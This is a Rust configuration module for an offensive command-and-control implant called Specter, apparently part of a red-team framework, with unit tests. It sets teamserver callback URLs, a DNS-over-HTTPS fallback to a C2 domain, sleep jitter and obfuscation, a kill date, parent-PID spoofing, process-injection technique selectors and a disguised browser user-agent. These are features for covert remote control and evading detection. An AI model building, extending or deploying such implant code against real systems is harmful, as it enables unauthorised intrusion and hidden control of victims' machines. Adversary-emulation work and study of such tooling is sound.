//! Agent configuration for the Specter implant.

use std::ffi::{OsStr, OsString};

use crate::doh_transport::DohProvider;
use crate::error::SpecterError;

/// Configuration for the Specter agent.
#[derive(Debug, Clone)]
pub struct SpecterConfig {
    /// Teamserver callback URL (e.g. `https://10.0.0.1:443/callback`).
    pub callback_url: String,
    /// Optional HKDF init secret matching the listener's `init_secret` setting.
    pub init_secret: Option<String>,
    /// PEM-encoded certificate to pin for TLS connections to the teamserver.
    ///
    /// When set, only the teamserver presenting this certificate (or one signed by it) is
    /// trusted. When `None`, the system CA store is used instead.  Baked in at compile time
    /// via the `SPECTER_PINNED_CERT_PEM` environment variable.
    pub pinned_cert_pem: Option<String>,
    /// User-Agent string sent in HTTP callbacks.
    pub user_agent: String,
    /// Sleep delay between callbacks in milliseconds.
    pub sleep_delay_ms: u32,
    /// Jitter percentage (0–100) applied to the sleep delay.
    pub sleep_jitter: u32,
    /// Optional kill date as a Unix timestamp.  The agent exits after this time.
    pub kill_date: Option<i64>,
    /// Optional working-hours bitmask.
    pub working_hours: Option<i32>,
    /// Spoofed parent PID for child process creation (set by `CommandProcPpidSpoof`).
    pub ppid_spoof: Option<u32>,
    /// Verbose output flag (set by `CommandConfig` / `ImplantVerbose`).
    pub verbose: bool,
    /// Sleep obfuscation technique identifier.
    pub sleep_technique: u32,
    /// Whether COFF execution uses a dedicated thread.
    pub coffee_threaded: bool,
    /// Whether COFF execution uses a Vectored Exception Handler.
    pub coffee_veh: bool,
    /// Default memory allocation technique identifier.
    pub memory_alloc: u32,
    /// Default memory execution technique identifier.
    pub memory_execute: u32,
    /// Default process injection technique identifier.
    pub inject_technique: u32,
    /// Sleep-obfuscation spoof thread start address: `(library, function, offset)`.
    pub spf_thread_addr: Option<(String, String, u32)>,
    /// Injection spoof address: `(library, function, offset)`.
    pub inject_spoof_addr: Option<(String, String, u32)>,
    /// Default 64-bit spawn process path for injection.
    pub spawn64: Option<String>,
    /// Default 32-bit spawn process path for injection.
    pub spawn32: Option<String>,
    /// Authoritative C2 domain for the DNS-over-HTTPS fallback transport.
    ///
    /// When set, the agent falls back to DoH if HTTP callbacks fail.  Must be
    /// the zone served by the teamserver's DNS listener
    /// (e.g. `"c2.example.com"`).  When `None`, DoH is disabled.
    /// Configurable via `SPECTER_DOH_DOMAIN` / `--doh-domain`.
    pub doh_domain: Option<String>,
    /// DoH resolver to use when `doh_domain` is set.
    ///
    /// Defaults to Cloudflare (`1.1.1.1`).
    /// Configurable via `SPECTER_DOH_PROVIDER` / `--doh-provider` (`cloudflare` or `google`).
    pub doh_provider: DohProvider,
}

impl SpecterConfig {
    /// Build a configuration from command-line arguments and environment variables.
    ///
    /// Environment variables are applied first and may be overridden by CLI flags:
    /// `SPECTER_CALLBACK_URL`, `SPECTER_INIT_SECRET`, `SPECTER_USER_AGENT`,
    /// `SPECTER_SLEEP_DELAY_MS`, `SPECTER_SLEEP_JITTER`, `SPECTER_KILL_DATE`,
    /// and `SPECTER_WORKING_HOURS`.
    pub fn from_sources<I, S, J, K, V>(args: I, env: J) -> Result<Self, SpecterError>
    where
        I: IntoIterator<Item = S>,
        S: Into<OsString>,
        J: IntoIterator<Item = (K, V)>,
        K: Into<OsString>,
        V: Into<OsString>,
    {
        let mut config = Self::default();
        config.apply_env(env)?;
        config.apply_args(args)?;
        config.validate()?;
        Ok(config)
    }

    /// Validate the configuration, returning an error if any field is invalid.
    pub fn validate(&self) -> Result<(), SpecterError> {
        if self.callback_url.is_empty() {
            return Err(SpecterError::InvalidConfig("callback_url must not be empty"));
        }
        if matches!(self.init_secret.as_deref(), Some("")) {
            return Err(SpecterError::InvalidConfig("init_secret must not be empty"));
        }
        if self.sleep_jitter > 100 {
            return Err(SpecterError::InvalidConfig("sleep_jitter must be 0–100"));
        }
        Ok(())
    }

    /// Return CLI help text for the Specter binary.
    pub fn usage() -> &'static str {
        concat!(
            "Usage: specter [options]\n\n",
            "Options:\n",
            "  --callback-url URL       Teamserver callback endpoint\n",
            "  --init-secret SECRET     HKDF listener init secret\n",
            "  --user-agent VALUE       HTTP User-Agent header\n",
            "  --sleep-delay-ms N       Base sleep interval in milliseconds\n",
            "  --sleep-jitter N         Sleep jitter percentage (0-100)\n",
            "  --kill-date UNIX_TS      Exit after this Unix timestamp\n",
            "  --working-hours MASK     Working-hours bitmask advertised in init\n",
            "  --doh-domain DOMAIN      C2 authoritative domain for DoH fallback\n",
            "  --doh-provider NAME      DoH resolver: cloudflare (default) or google\n",
            "  -h, --help               Show this help text\n\n",
            "Environment:\n",
            "  SPECTER_CALLBACK_URL, SPECTER_INIT_SECRET, SPECTER_USER_AGENT,\n",
            "  SPECTER_SLEEP_DELAY_MS, SPECTER_SLEEP_JITTER, SPECTER_KILL_DATE,\n",
            "  SPECTER_WORKING_HOURS, SPECTER_PINNED_CERT_PEM,\n",
            "  SPECTER_DOH_DOMAIN, SPECTER_DOH_PROVIDER\n",
        )
    }

    fn apply_env<J, K, V>(&mut self, env: J) -> Result<(), SpecterError>
    where
        J: IntoIterator<Item = (K, V)>,
        K: Into<OsString>,
        V: Into<OsString>,
    {
        for (key, value) in env {
            let key = key.into();
            let value = value.into();
            match key.to_str() {
                Some("SPECTER_CALLBACK_URL") => {
                    self.callback_url = parse_os_string(value, "SPECTER_CALLBACK_URL")?;
                }
                Some("SPECTER_INIT_SECRET") => {
                    self.init_secret = Some(parse_os_string(value, "SPECTER_INIT_SECRET")?);
                }
                Some("SPECTER_USER_AGENT") => {
                    self.user_agent = parse_os_string(value, "SPECTER_USER_AGENT")?;
                }
                Some("SPECTER_SLEEP_DELAY_MS") => {
                    self.sleep_delay_ms = parse_os_value(&value, "SPECTER_SLEEP_DELAY_MS")?;
                }
                Some("SPECTER_SLEEP_JITTER") => {
                    self.sleep_jitter = parse_os_value(&value, "SPECTER_SLEEP_JITTER")?;
                }
                Some("SPECTER_KILL_DATE") => {
                    self.kill_date = Some(parse_os_value(&value, "SPECTER_KILL_DATE")?);
                }
                Some("SPECTER_WORKING_HOURS") => {
                    self.working_hours = Some(parse_os_value(&value, "SPECTER_WORKING_HOURS")?);
                }
                Some("SPECTER_PINNED_CERT_PEM") => {
                    self.pinned_cert_pem = Some(parse_os_string(value, "SPECTER_PINNED_CERT_PEM")?);
                }
                Some("SPECTER_DOH_DOMAIN") => {
                    self.doh_domain = Some(parse_os_string(value, "SPECTER_DOH_DOMAIN")?);
                }
                Some("SPECTER_DOH_PROVIDER") => {
                    let s = parse_os_string(value, "SPECTER_DOH_PROVIDER")?;
                    self.doh_provider = parse_doh_provider(&s, "SPECTER_DOH_PROVIDER")?;
                }
                _ => {}
            }
        }

        Ok(())
    }

    fn apply_args<I, S>(&mut self, args: I) -> Result<(), SpecterError>
    where
        I: IntoIterator<Item = S>,
        S: Into<OsString>,
    {
        let mut args = args.into_iter().map(Into::into);
        let _program_name = args.next();

        while let Some(argument) = args.next() {
            let argument_string = parse_os_string(argument, "argument")?;
            if matches!(argument_string.as_str(), "-h" | "--help") {
                continue;
            }

            let (flag, inline_value) = match argument_string.split_once('=') {
                Some((flag, value)) => (flag, Some(value.to_string())),
                None => (argument_string.as_str(), None),
            };

            let value = match inline_value {
                Some(value) => value,
                None => {
                    let next = args.next().ok_or_else(|| {
                        SpecterError::Argument(format!("missing value for {flag}"))
                    })?;
                    parse_os_string(next, flag)?
                }
            };

            match flag {
                "--callback-url" => self.callback_url = value,
                "--init-secret" => self.init_secret = Some(value),
                "--user-agent" => self.user_agent = value,
                "--sleep-delay-ms" => {
                    self.sleep_delay_ms = parse_string_value(&value, flag)?;
                }
                "--sleep-jitter" => {
                    self.sleep_jitter = parse_string_value(&value, flag)?;
                }
                "--kill-date" => {
                    self.kill_date = Some(parse_string_value(&value, flag)?);
                }
                "--working-hours" => {
                    self.working_hours = Some(parse_string_value(&value, flag)?);
                }
                "--doh-domain" => self.doh_domain = Some(value),
                "--doh-provider" => {
                    self.doh_provider = parse_doh_provider(&value, flag)?;
                }
                _ => return Err(SpecterError::Argument(format!("unknown argument {flag}"))),
            }
        }

        Ok(())
    }
}

impl Default for SpecterConfig {
    fn default() -> Self {
        Self {
            callback_url: String::from("https://127.0.0.1:40056/"),
            init_secret: None,
            // Baked in at compile time — set SPECTER_PINNED_CERT_PEM when building the implant.
            pinned_cert_pem: option_env!("SPECTER_PINNED_CERT_PEM").map(str::to_string),
            user_agent: String::from(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            ),
            sleep_delay_ms: 5000,
            sleep_jitter: 0,
            kill_date: None,
            working_hours: None,
            ppid_spoof: None,
            verbose: false,
            sleep_technique: 0,
            coffee_threaded: false,
            coffee_veh: false,
            memory_alloc: 0,
            memory_execute: 0,
            inject_technique: 0,
            spf_thread_addr: None,
            inject_spoof_addr: None,
            spawn64: None,
            spawn32: None,
            doh_domain: None,
            doh_provider: DohProvider::Cloudflare,
        }
    }
}

fn parse_doh_provider(s: &str, key: &str) -> Result<DohProvider, SpecterError> {
    match s {
        "cloudflare" => Ok(DohProvider::Cloudflare),
        "google" => Ok(DohProvider::Google),
        _ => Err(SpecterError::Argument(format!(
            "invalid value for {key}: {s:?} (expected \"cloudflare\" or \"google\")"
        ))),
    }
}

fn parse_os_string(value: OsString, key: &str) -> Result<String, SpecterError> {
    value.into_string().map_err(|_| SpecterError::Argument(format!("{key} must be valid UTF-8")))
}

fn parse_os_value<T>(value: &OsStr, key: &str) -> Result<T, SpecterError>
where
    T: std::str::FromStr,
{
    let value = value
        .to_str()
        .ok_or_else(|| SpecterError::Argument(format!("{key} must be valid UTF-8")))?;
    parse_string_value(value, key)
}

fn parse_string_value<T>(value: &str, key: &str) -> Result<T, SpecterError>
where
    T: std::str::FromStr,
{
    value
        .parse::<T>()
        .map_err(|_| SpecterError::Argument(format!("invalid value for {key}: {value}")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_config_is_valid() {
        let config = SpecterConfig::default();
        assert!(config.validate().is_ok());
    }

    #[test]
    fn empty_callback_url_is_invalid() {
        let config = SpecterConfig { callback_url: String::new(), ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn jitter_over_100_is_invalid() {
        let config = SpecterConfig { sleep_jitter: 101, ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn empty_init_secret_is_invalid() {
        let config = SpecterConfig { init_secret: Some(String::new()), ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn from_sources_applies_environment_values() {
        let config = SpecterConfig::from_sources(
            ["specter"],
            [
                ("SPECTER_CALLBACK_URL", "https://teamserver.local/"),
                ("SPECTER_USER_AGENT", "specter-test"),
                ("SPECTER_SLEEP_DELAY_MS", "1500"),
                ("SPECTER_SLEEP_JITTER", "15"),
                ("SPECTER_KILL_DATE", "1700000000"),
                ("SPECTER_WORKING_HOURS", "255"),
                ("SPECTER_INIT_SECRET", "sekrit"),
            ],
        )
        .expect("config");

        assert_eq!(config.callback_url, "https://teamserver.local/");
        assert_eq!(config.user_agent, "specter-test");
        assert_eq!(config.sleep_delay_ms, 1500);
        assert_eq!(config.sleep_jitter, 15);
        assert_eq!(config.kill_date, Some(1_700_000_000));
        assert_eq!(config.working_hours, Some(255));
        assert_eq!(config.init_secret.as_deref(), Some("sekrit"));
        assert!(config.pinned_cert_pem.is_none());
    }

    #[test]
    fn from_sources_applies_pinned_cert_pem_from_env() {
        let config = SpecterConfig::from_sources(
            ["specter"],
            [
                ("SPECTER_CALLBACK_URL", "https://teamserver.local/"),
                (
                    "SPECTER_PINNED_CERT_PEM",
                    "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n",
                ),
            ],
        )
        .expect("config");

        assert_eq!(
            config.pinned_cert_pem.as_deref(),
            Some("-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n")
        );
    }

    #[test]
    fn from_sources_prefers_cli_over_environment() {
        let config = SpecterConfig::from_sources(
            [
                "specter",
                "--callback-url",
                "https://override.local/",
                "--sleep-delay-ms=2500",
                "--sleep-jitter",
                "5",
            ],
            [("SPECTER_CALLBACK_URL", "https://env.local/"), ("SPECTER_SLEEP_DELAY_MS", "1000")],
        )
        .expect("config");

        assert_eq!(config.callback_url, "https://override.local/");
        assert_eq!(config.sleep_delay_ms, 2500);
        assert_eq!(config.sleep_jitter, 5);
    }

    #[test]
    fn from_sources_rejects_unknown_arguments() {
        let error = SpecterConfig::from_sources(
            ["specter", "--bogus", "value"],
            std::iter::empty::<(&str, &str)>(),
        )
        .expect_err("unknown flag should fail");
        assert!(matches!(
            error,
            SpecterError::Argument(message) if message.contains("--bogus")
        ));
    }

    #[test]
    fn from_sources_rejects_invalid_numeric_values() {
        let error = SpecterConfig::from_sources(
            ["specter", "--sleep-jitter", "oops"],
            std::iter::empty::<(&str, &str)>(),
        )
        .expect_err("invalid number should fail");
        assert!(matches!(
            error,
            SpecterError::Argument(message) if message.contains("--sleep-jitter")
        ));
    }

    #[test]
    fn usage_mentions_supported_inputs() {
        let usage = SpecterConfig::usage();
        assert!(usage.contains("--callback-url"));
        assert!(usage.contains("SPECTER_CALLBACK_URL"));
        assert!(usage.contains("--doh-domain"));
        assert!(usage.contains("SPECTER_DOH_DOMAIN"));
    }

    #[test]
    fn doh_domain_unset_by_default() {
        let config = SpecterConfig::default();
        assert!(config.doh_domain.is_none());
        assert_eq!(config.doh_provider, DohProvider::Cloudflare);
    }

    #[test]
    fn from_sources_applies_doh_domain_from_env() {
        let config = SpecterConfig::from_sources(
            ["specter"],
            [
                ("SPECTER_CALLBACK_URL", "https://teamserver.local/"),
                ("SPECTER_DOH_DOMAIN", "c2.example.com"),
                ("SPECTER_DOH_PROVIDER", "google"),
            ],
        )
        .expect("config");

        assert_eq!(config.doh_domain.as_deref(), Some("c2.example.com"));
        assert_eq!(config.doh_provider, DohProvider::Google);
    }

    #[test]
    fn from_sources_applies_doh_domain_from_cli() {
        let config = SpecterConfig::from_sources(
            ["specter", "--doh-domain", "c2.test.com", "--doh-provider", "cloudflare"],
            std::iter::empty::<(&str, &str)>(),
        )
        .expect("config");

        assert_eq!(config.doh_domain.as_deref(), Some("c2.test.com"));
        assert_eq!(config.doh_provider, DohProvider::Cloudflare);
    }

    #[test]
    fn from_sources_rejects_invalid_doh_provider() {
        let error = SpecterConfig::from_sources(
            ["specter", "--doh-provider", "fakeprovider"],
            std::iter::empty::<(&str, &str)>(),
        )
        .expect_err("invalid provider should fail");
        assert!(matches!(
            error,
            SpecterError::Argument(ref msg) if msg.contains("fakeprovider")
        ));
    }
}
